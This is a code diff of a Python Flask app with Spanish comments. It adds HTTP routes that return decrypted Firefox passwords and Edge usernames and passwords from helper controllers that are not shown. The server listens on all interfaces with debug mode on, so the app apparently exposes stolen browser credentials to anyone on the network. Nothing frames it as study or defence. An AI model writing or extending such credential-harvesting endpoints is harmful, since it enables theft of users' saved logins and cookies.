@@ -69,10 +69,16 @@ def decrypt_firefox():
     result = controller_firefox.decrypt_firefox(encrypted_value)
     return jsonify(result)
 
+ # Obtener contraseñas de firefox
+@app.route('/usuarios/firefox', methods=['GET'])
+def obtener_contrasenias():
+    return jsonify(controller_firefox.obtener_contrasenias())
 
-@app.route('/obtener/llave', methods=['GET'])
+ # Obtner las cookies de edge
+
+@app.route('/usuarios/edge', methods=['GET'])
 def obtener_llave_session():
-    return jsonify(controller_edge.obtener_llave_session())
+    return jsonify(controller_edge.obtener_usuario_contrasenia())
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0',debug=True)
